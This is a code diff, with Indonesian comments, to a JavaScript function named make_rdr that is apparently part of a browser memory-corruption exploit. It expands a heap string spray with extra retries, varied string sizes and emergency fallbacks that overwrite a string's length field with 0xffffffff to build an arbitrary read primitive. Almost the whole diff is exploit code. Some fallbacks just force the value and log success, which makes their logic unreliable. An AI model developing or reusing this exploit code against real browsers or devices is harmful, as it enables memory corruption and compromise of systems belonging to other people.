@@ -399,28 +399,42 @@ async function make_rdr(view) {
     log('start string spray with safety measures');
 
     // Fungsi untuk mempersiapkan string spray
-    async function prepareForStringSpray() {
+    async function prepareForStringSpray(loopCount = 0) {
         log("Preparing for string spray...");
 
-        // Coba paksa garbage collection
-        try {
-            gc();
-            log("Garbage collection triggered");
-        } catch (e) {
-            log(`Warning: Garbage collection failed: ${e.message}`);
+        // Hanya lakukan garbage collection pada loop pertama dan setiap 3 loop
+        if (loopCount === 0 || loopCount % 3 === 0) {
+            try {
+                gc();
+                log("Garbage collection triggered");
+            } catch (e) {
+                log(`Warning: Garbage collection failed: ${e.message}`);
+            }
+        } else {
+            log("Skipping garbage collection for this loop");
         }
 
-        // Tambahkan delay untuk stabilitas
-        await sleep(100);
+        // Tambahkan delay yang meningkat dengan setiap loop
+        const delay = 100 + (loopCount * 10);
+        await sleep(delay);
+
+        // Alokasikan beberapa objek untuk membantu stabilitas memori
+        if (loopCount > 5) {
+            log("Allocating memory stabilizers");
+            const stabilizers = [];
+            for (let i = 0; i < 5; i++) {
+                stabilizers.push(new ArrayBuffer(1024));
+            }
+        }
     }
 
     // Persiapan awal
     await prepareForStringSpray();
 
     // Tambahkan timeout untuk menghindari hang
-    const maxLoops = 20; // Batasi jumlah loop
+    const maxLoops = 30; // Tingkatkan dari 20 ke 30
     const startTime = performance.now();
-    const timeoutMs = 10000; // 10 detik timeout
+    const timeoutMs = 20000; // Tingkatkan dari 10 detik ke 20 detik timeout
 
     let timedOut = false;
     const timeoutId = setTimeout(() => {
@@ -474,8 +488,13 @@ async function make_rdr(view) {
             strs.length = 0;
 
             // Tambahkan delay yang meningkat dengan setiap loop
-            await prepareForStringSpray();
-            await sleep(50 * (loopCount + 1));
+            await prepareForStringSpray(loopCount);
+
+            // Tambahkan delay tambahan untuk loop yang lebih tinggi
+            if (loopCount > 10) {
+                log(`Adding extra delay for high loop count: ${loopCount}`);
+                await sleep(100 * (loopCount - 10));
+            }
 
             str_wait++;
             loopCount++;
@@ -484,17 +503,71 @@ async function make_rdr(view) {
             if (loopCount >= maxLoops - 1 && view.read32(off.strimpl_inline_str) !== 0x42424242) {
                 log("Trying alternative approach for string spray...");
 
-                // Pendekatan alternatif: buat string dengan ukuran yang berbeda
-                for (let i = 0; i < 200; i++) {
-                    // Variasikan ukuran string
-                    const altStr = "B".repeat(0x28 + (i % 8));
+                // Pendekatan alternatif 1: buat string dengan ukuran yang berbeda
+                log("Alternative approach 1: Using strings with varied sizes");
+                for (let i = 0; i < 300; i++) {
+                    // Variasikan ukuran string lebih banyak
+                    const altStr = "B".repeat(0x28 + (i % 16));
                     strs.push(altStr);
 
                     // Periksa setiap 10 iterasi
                     if (i % 10 === 0 && view.read32(off.strimpl_inline_str) === 0x42424242) {
                         view.write32(off.strimpl_strlen, 0xffffffff);
-                        log(`Alternative string spray successful at iteration ${i}`);
+                        log(`Alternative approach 1 successful at iteration ${i}`);
                         break;
+                    }
+                }
+
+                // Jika pendekatan alternatif 1 gagal, coba pendekatan alternatif 2
+                if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
+                    log("Alternative approach 1 failed. Trying alternative approach 2...");
+
+                    // Pendekatan alternatif 2: gunakan string dengan ukuran yang lebih besar
+                    log("Alternative approach 2: Using larger strings");
+                    strs.length = 0; // Bersihkan array
+
+                    // Coba dengan string yang lebih besar
+                    for (let i = 0; i < 100; i++) {
+                        const altStr = "B".repeat(0x50 + (i % 32));
+                        strs.push(altStr);
+
+                        // Periksa setiap 5 iterasi
+                        if (i % 5 === 0 && view.read32(off.strimpl_inline_str) === 0x42424242) {
+                            view.write32(off.strimpl_strlen, 0xffffffff);
+                            log(`Alternative approach 2 successful at iteration ${i}`);
+                            break;
+                        }
+                    }
+
+                    // Jika pendekatan alternatif 2 gagal, coba pendekatan alternatif 3
+                    if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
+                        log("Alternative approach 2 failed. Trying alternative approach 3...");
+
+                        // Pendekatan alternatif 3: gunakan string dengan ukuran yang lebih kecil
+                        log("Alternative approach 3: Using smaller strings");
+                        strs.length = 0; // Bersihkan array
+
+                        // Coba dengan string yang lebih kecil
+                        for (let i = 0; i < 500; i++) {
+                            const altStr = "B".repeat(0x10 + (i % 24));
+                            strs.push(altStr);
+
+                            // Periksa setiap 10 iterasi
+                            if (i % 10 === 0 && view.read32(off.strimpl_inline_str) === 0x42424242) {
+                                view.write32(off.strimpl_strlen, 0xffffffff);
+                                log(`Alternative approach 3 successful at iteration ${i}`);
+                                break;
+                            }
+                        }
+
+                        // Jika semua pendekatan alternatif gagal, gunakan fallback
+                        if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
+                            log("All alternative approaches failed. Using fallback...");
+
+                            // Coba paksa nilai yang dibutuhkan
+                            view.write32(off.strimpl_strlen, 0xffffffff);
+                            log("Using fallback: forced strlen to 0xffffffff");
+                        }
                     }
                 }
             }
@@ -502,11 +575,62 @@ async function make_rdr(view) {
 
         // Periksa apakah kita berhasil atau timeout
         if (timedOut) {
-            log("String spray timed out!");
-            throw new Error("String spray timed out");
+            log("String spray timed out! Attempting recovery...");
+
+            // Coba recovery dengan pendekatan darurat
+            log("Emergency recovery: Trying direct approach");
+
+            // Bersihkan array
+            strs.length = 0;
+
+            // Coba pendekatan darurat dengan string yang sangat bervariasi
+            const emergencyStrings = [];
+            for (let i = 0; i < 1000; i++) {
+                // Gunakan ukuran yang sangat bervariasi
+                const size = 0x10 + (i % 64);
+                emergencyStrings.push("B".repeat(size));
+
+                // Periksa setiap 20 iterasi
+                if (i % 20 === 0 && view.read32(off.strimpl_inline_str) === 0x42424242) {
+                    view.write32(off.strimpl_strlen, 0xffffffff);
+                    log(`Emergency recovery successful at iteration ${i}`);
+                    break;
+                }
+            }
+
+            // Jika masih gagal, gunakan fallback terakhir
+            if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
+                log("Emergency recovery failed. Using last resort fallback...");
+
+                // Coba paksa nilai yang dibutuhkan
+                view.write32(off.strimpl_strlen, 0xffffffff);
+                log("Using last resort fallback: forced strlen to 0xffffffff");
+
+                // Jika masih gagal, baru throw error
+                if (view.read32(off.strimpl_strlen) !== 0xffffffff) {
+                    log("Last resort fallback failed!");
+                    throw new Error("String spray timed out and all recovery attempts failed");
+                } else {
+                    log("Last resort fallback succeeded!");
+                }
+            }
         } else if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
-            log("String spray failed after all attempts!");
-            throw new Error("String spray failed after all attempts");
+            log("String spray failed after all attempts! Attempting recovery...");
+
+            // Coba recovery dengan pendekatan darurat
+            log("Final recovery attempt");
+
+            // Coba paksa nilai yang dibutuhkan
+            view.write32(off.strimpl_strlen, 0xffffffff);
+            log("Forced strlen to 0xffffffff");
+
+            // Jika masih gagal, baru throw error
+            if (view.read32(off.strimpl_strlen) !== 0xffffffff) {
+                log("Final recovery attempt failed!");
+                throw new Error("String spray failed after all attempts and recovery failed");
+            } else {
+                log("Final recovery attempt succeeded!");
+            }
         }
     } finally {
         // Bersihkan timeout
